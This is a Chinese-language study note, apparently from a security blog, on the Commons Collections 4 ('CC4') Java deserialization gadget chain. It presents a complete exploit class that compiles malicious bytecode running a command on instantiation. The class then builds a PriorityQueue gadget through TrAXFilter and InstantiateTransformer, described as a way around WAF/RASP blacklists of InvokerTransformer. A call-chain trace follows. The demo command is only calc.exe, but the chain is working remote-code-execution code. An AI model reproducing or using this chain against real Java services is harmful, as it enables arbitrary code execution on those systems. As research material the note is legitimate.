---
title: CC4链
date: 2026-03-28
updated: 2026-03-28
tags:
  - 链子
categories:
  - 链子
description: CC4链
published: true
---
结合 CC2 的 `PriorityQueue` 入口和 CC3 的 `TrAXFilter` + `InstantiateTransformer` 技术，绕过 `InvokerTransformer` 的限制。

> CC2 链核心是 `InvokerTransformer`。由于这个类太常用于恶意攻击，很多安全防御系统（WAF、RASP）都把它加入了黑名单。

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class CC4Exp {

    public static void main(String[] args) throws Exception {

        // 动态生成包含恶意命令的字节码
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.makeClass("EvilClass");
        ctClass.setSuperclass(pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));

        CtConstructor constructor = new CtConstructor(new CtClass[]{}, ctClass);
        constructor.setBody("{ java.lang.Runtime.getRuntime().exec(\"calc.exe\"); }");
        ctClass.addConstructor(constructor);

        byte[] bytecodes = ctClass.toBytecode();

        // 将木马装入 TemplatesImpl
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_bytecodes", new byte[][]{bytecodes});
        setFieldValue(templates, "_name", "EvilTemplates");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

        // 构造“无 InvokerTransformer”的恶意调用链
        // 目标是实例化 TrAXFilter，从而触发 TemplatesImpl
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(
                        new Class[]{Templates.class},
                        new Object[]{templates}
                )
        };
        Transformer chainedTransformer = new ChainedTransformer(transformers);

        // 不能直接把 chainedTransformer 放进 TransformingComparator
        // 否则在下面 queue.add() 的时候就会立刻弹计算器，导致序列化失败。
        // 所以，先用一个完全无害的 ConstantTransformer 占位。
        Transformer fakeTransformer = new ConstantTransformer(1);
        TransformingComparator comparator = new TransformingComparator(fakeTransformer);

        // 构造入口 PriorityQueue
        PriorityQueue queue = new PriorityQueue(2, comparator);

        // 往队列里添加两个元素，触发排序。
        // 因为现在比较器里是 fakeTransformer，所以只会安全地返回 1，不会爆炸。
        queue.add(1);
        queue.add(2);

        // 队列装填完毕后，利用反射，把 TransformingComparator 里的替身
        // 替换成真正致命的 chainedTransformer
        setFieldValue(comparator, "transformer", chainedTransformer);

        byte[] serializedQueue = serialize(queue);
        System.out.println("CC4 恶意对象序列化完成...");

        unserialize(serializedQueue);
    }

    // 辅助方法：通过反射设置私有字段的值
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static byte[] serialize(Object obj) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(obj);
        return baos.toByteArray();
    }

    public static void unserialize(byte[] data) throws Exception {
        ByteArrayInputStream bais = new ByteArrayInputStream(data);
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
        ois.close();
    }
}
```

前面和 CC2 的前半部分一样

这里的 `transformer` 已经被反射修改为 `chainedTransformer`

![[attachments/20260328165639.png]]

这里会依次执行两个 Transformer

![[attachments/20260328165829.png]]

![[attachments/20260328170118.png]]

这里的 `iParamTypes` 是 `{Templates.class}`，`iArgs` 是 `{templates}`

![[attachments/20260328170400.png]]

![[attachments/20260328170616.png]]

后面和 CC3 后半部分一样

```
ois.readObject() <=> ObjectInputStream.readObject()
PriorityQueue::readObject()
	->PriorityQueue::heapify()
	->PriorityQueue::siftDown()
	->PriorityQueue::siftDownUsingComparator()
	->TransformingComparator::compare()
	->ChainedTransformer::transform()
	->ConstantTransformer::transform()
	->InstantiateTransformer::transform()
	->TrAXFilter::<init>()                        // 调用构造方法
	->TemplatesImpl::newTransformer()
	->TemplatesImpl::getTransletInstance()
	->TemplatesImpl::defineTransletClasses()      // 加载恶意字节码为 Class
	->MaliciousClass::<init>()                    // 实例化恶意类执行命令
```